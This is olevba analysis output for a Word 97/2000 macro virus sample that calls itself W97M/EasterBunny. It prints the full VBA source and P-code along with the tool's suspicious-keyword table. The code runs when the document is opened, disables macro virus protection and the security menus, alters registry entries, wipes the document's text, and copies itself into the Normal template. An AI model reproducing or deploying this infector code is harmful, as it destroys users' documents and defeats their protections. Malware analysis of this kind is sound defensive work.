olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Chameleon.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Chameleon.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Easter_Bunny()
' W97M/Easter Bunny: by Total Konfuzion
' Should spread under Word2000
' Greetingz from the Easter Bunny

    On Error Resume Next
    
    Dim BlankLine
    
    If ActiveDocument.Name <> "EB.doc" Then
        Options.BlueScreen = (Rnd * 0) + 1
        
        With Selection
            .HomeKey unit:=wdStory
            .EndKey unit:=wdStory, Extend:=wdExtend
            .Delete unit:=wdCharacter, Count:=(Rnd * 0) + 1
        End With
        
        With Selection
            .ParagraphFormat.Alignment = wdAlignParagraphCenter
            .Font.Name = "Arial"
            .Font.Bold = (Rnd * 0) + 1
            .Font.Size = (Rnd * 0) + 20
            For BlankLine = 1 To 8
                Selection.TypeParagraph
            Next BlankLine
            .TypeText Text:="()...()"
            .TypeParagraph
            .TypeText Text:="( ' = ' )"
            .TypeParagraph
            .TypeText Text:="(''')(''')"
            For BlankLine = 1 To 3
                Selection.TypeParagraph
            Next BlankLine
            .Font.Name = "Comic Sans MS"
            .TypeText Text:="Happy Easter from the Easter Bunny.. !!"
            .Font.Bold = (Rnd * 0)
            .HomeKey unit:=wdStory
        End With
    End If
End Sub
Private Sub Document_Open()
    On Error Resume Next
    
    If Day(Now) = Minute(Now) Then MsgBox "Your system is infected with the Easter Bunny virus.   >8)", vbExclamation + vbSystemModal, "W97M/EasterBunny"
    
    With Options
        .VirusProtection = (Rnd * 0)
        .SaveNormalPrompt = (Rnd * 0)
        .ConfirmConversions = (Rnd * 0)
    End With
    
    With System
        .PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "Total Konfuzion   >8)"
        .PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "W97M/EasterBunny"""
    End With
    
    If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Security\", "Level") <> "" Then
        CommandBars("Macro").Controls("Security...").Enabled = (Rnd * 0)
    Else
        CommandBars("Tools").Controls("Macro").Enabled = (Rnd * 0)
        CommandBars("Tools").Controls("Templates and Add-ins...").Enabled = (Rnd * 0)
        CommandBars("Format").Controls("Style Gallery...").Enabled = (Rnd * 0)
    End If
    
    With Application
        .EnableCancelKey = wdCancelDisabled
        .UserName = "Total Konfuzion"
        .UserInitials = "TD"
        .UserAddress = "W97M/EasterBunny"
    End With
    
    Call Easter_Bunny
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "W97M/EasterBunny") = "by Total Konfuzion   >8)"
    
    If ThisDocument = ActiveDocument Then Set Infect = NormalTemplate Else Set Infect = ActiveDocument
    
    EB = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
    
    Set Dest = Infect.VBProject.VBComponents.Item(1).CodeModule
    Dest.DeleteLines 1, Dest.CountOfLines
    Dest.AddFromString EB
    
    If Infect = ActiveDocument Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
Sub HelpAbout()
    MsgBox " « ¤ ° =  Easter Bunny virus.. !!  = ° ¤ »" + Chr(10) + "-------------------------------------------------------------" + Chr(10) + Chr(10) + "         -Total Konfuzion-", vbInformation + vbSystemModal, "Happy Easter from the.."
    Dialogs(wdDialogHelpAbout).Show
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Chameleon.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7275 bytes
' Line #0:
' 	FuncDefn (Private Sub Easter_Bunny())
' Line #1:
' 	QuoteRem 0x0000 0x0026 " W97M/Easter Bunny: by Total Konfuzion"
' Line #2:
' 	QuoteRem 0x0000 0x001D " Should spread under Word2000"
' Line #3:
' 	QuoteRem 0x0000 0x0020 " Greetingz from the Easter Bunny"
' Line #4:
' Line #5:
' 	OnError (Resume Next) 
' Line #6:
' Line #7:
' 	Dim 
' 	VarDefn BlankLine
' Line #8:
' Line #9:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0006 "EB.doc"
' 	Ne 
' 	IfBlock 
' Line #10:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld Options 
' 	MemSt BlueScreen 
' Line #11:
' Line #12:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #13:
' 	Ld wdStory 
' 	ParamNamed unit 
' 	ArgsMemCallWith HomeKey 0x0001 
' Line #14:
' 	Ld wdStory 
' 	ParamNamed unit 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	ArgsMemCallWith EndKey 0x0002 
' Line #15:
' 	Ld wdCharacter 
' 	ParamNamed unit 
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	ParamNamed Count 
' 	ArgsMemCallWith Delete 0x0002 
' Line #16:
' 	EndWith 
' Line #17:
' Line #18:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #19:
' 	Ld wdAlignParagraphCenter 
' 	MemLdWith ParagraphFormat 
' 	MemSt Alignment 
' Line #20:
' 	LitStr 0x0005 "Arial"
' 	MemLdWith Font 
' 	MemSt New 
' Line #21:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	MemLdWith Font 
' 	MemSt Bold 
' Line #22:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0014 
' 	Add 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #23:
' 	StartForVariable 
' 	Ld BlankLine 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	For 
' Line #24:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #25:
' 	StartForVariable 
' 	Ld BlankLine 
' 	EndForVariable 
' 	NextVar 
' Line #26:
' 	LitStr 0x0007 "()...()"
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #27:
' 	ArgsMemCallWith TypeParagraph 0x0000 
' Line #28:
' 	LitStr 0x0009 "( ' = ' )"
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #29:
' 	ArgsMemCallWith TypeParagraph 0x0000 
' Line #30:
' 	LitStr 0x000A "(''')(''')"
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #31:
' 	StartForVariable 
' 	Ld BlankLine 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	For 
' Line #32:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #33:
' 	StartForVariable 
' 	Ld BlankLine 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	LitStr 0x000D "Comic Sans MS"
' 	MemLdWith Font 
' 	MemSt New 
' Line #35:
' 	LitStr 0x0027 "Happy Easter from the Easter Bunny.. !!"
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #36:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	MemLdWith Font 
' 	MemSt Bold 
' Line #37:
' 	Ld wdStory 
' 	ParamNamed unit 
' 	ArgsMemCallWith HomeKey 0x0001 
' Line #38:
' 	EndWith 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	EndSub 
' Line #41:
' 	FuncDefn (Private Sub Document_Open())
' Line #42:
' 	OnError (Resume Next) 
' Line #43:
' Line #44:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x003A "Your system is infected with the Easter Bunny virus.   >8)"
' 	Ld vbExclamation 
' 	Ld vbSystemModal 
' 	Add 
' 	LitStr 0x0010 "W97M/EasterBunny"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #45:
' Line #46:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #47:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	MemStWith VirusProtection 
' Line #48:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	MemStWith SaveNormalPrompt 
' Line #49:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	MemStWith ConfirmConversions 
' Line #50:
' 	EndWith 
' Line #51:
' Line #52:
' 	StartWithExpr 
' 	Ld System 
' 	With 
' Line #53:
' 	LitStr 0x0015 "Total Konfuzion   >8)"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000F "RegisteredOwner"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #54:
' 	LitStr 0x0011 "W97M/EasterBunny""
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #55:
' 	EndWith 
' Line #56:
' Line #57:
' 	LitStr 0x0000 ""
' 	LitStr 0x0039 "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Security\"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #58:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #59:
' 	ElseBlock 
' Line #60:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #61:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	LitStr 0x0018 "Templates and Add-ins..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #62:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	LitStr 0x0010 "Style Gallery..."
' 	LitStr 0x0006 "Format"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #63:
' 	EndIfBlock 
' Line #64:
' Line #65:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #66:
' 	Ld wdCancelDisabled 
' 	MemStWith EnableCancelKey 
' Line #67:
' 	LitStr 0x000F "Total Konfuzion"
' 	MemStWith UserName 
' Line #68:
' 	LitStr 0x0002 "TD"
' 	MemStWith UserInitials 
' Line #69:
' 	LitStr 0x0010 "W97M/EasterBunny"
' 	MemStWith UserAddress 
' Line #70:
' 	EndWith 
' Line #71:
' Line #72:
' 	ArgsCall (Call) Easter_Bunny 0x0000 
' Line #73:
' Line #74:
' 	LitStr 0x0018 "by Total Konfuzion   >8)"
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0010 "W97M/EasterBunny"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #75:
' Line #76:
' 	Ld ThisDocument 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set Infect 
' 	Else 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Infect 
' 	EndIf 
' Line #77:
' Line #78:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St EB 
' Line #79:
' Line #80:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld Infect 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Dest 
' Line #81:
' 	LitDI2 0x0001 
' 	Ld Dest 
' 	MemLd CountOfLines 
' 	Ld Dest 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #82:
' 	Ld EB 
' 	Ld Dest 
' 	ArgsMemCall AddFromString 0x0001 
' Line #83:
' Line #84:
' 	Ld Infect 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #85:
' 	EndSub 
' Line #86:
' 	FuncDefn (Sub HelpAbout())
' Line #87:
' 	LitStr 0x002A " « ¤ ° =  Easter Bunny virus.. !!  = ° ¤ »"
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x003D "-------------------------------------------------------------"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001A "         -Total Konfuzion-"
' 	Add 
' 	Ld vbInformation 
' 	Ld vbSystemModal 
' 	Add 
' 	LitStr 0x0017 "Happy Easter from the.."
' 	ArgsCall MsgBox 0x0003 
' Line #88:
' 	Ld wdDialogHelpAbout 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #89:
' 	EndSub 
' Line #90:
' Line #91:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

